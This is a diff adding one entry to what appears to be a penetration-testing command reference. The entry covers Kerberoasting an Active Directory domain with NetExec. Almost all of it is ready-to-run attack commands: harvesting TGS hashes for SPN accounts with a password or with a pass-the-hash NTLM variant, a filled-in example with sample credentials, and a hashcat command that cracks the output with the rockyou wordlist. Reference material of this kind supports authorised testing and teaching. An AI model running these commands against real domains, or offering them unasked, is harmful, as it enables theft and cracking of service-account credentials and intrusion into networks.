@@ -1,0 +1,22 @@
+{
+  "id": "nxc-ldap-kerberoasting",
+  "name": "NetExec LDAP Kerberoasting",
+  "command": "nxc ldap <dc-ip> -u <user> -p <password> --kerberoasting <output.txt>",
+  "description": "Request TGS tickets for every account with a SPN and write hashes to a file ready for hashcat (-m 13100). Performed entirely over LDAP+Kerberos in a single command, no separate GetUserSPNs invocation needed.",
+  "platform": "linux",
+  "requires": ["password"],
+  "protocols": ["ldap", "kerberos"],
+  "tags": ["nxc", "netexec", "kerberoasting", "spn", "tgs"],
+  "variations": [
+    { "label": "NTLM Hash", "requires": "hash", "command": "nxc ldap <dc-ip> -u <user> -H <hash> --kerberoasting <output.txt>" },
+    { "label": "Filter by SPN OU", "requires": "password", "command": "nxc ldap <dc-ip> -u <user> -p <password> --kerberoasting <output.txt> --kdcHost <dc-fqdn>" }
+  ],
+  "references": [
+    { "title": "NetExec — LDAP Protocol", "url": "https://www.netexec.wiki/ldap-protocol" },
+    { "title": "The Hacker Recipes — Kerberoasting", "url": "https://www.thehacker.recipes/ad/movement/kerberos/kerberoast" }
+  ],
+  "examples": [
+    "nxc ldap 10.10.10.10 -u jdoe -p 'Password123!' --kerberoasting kerb.txt",
+    "hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt"
+  ]
+}
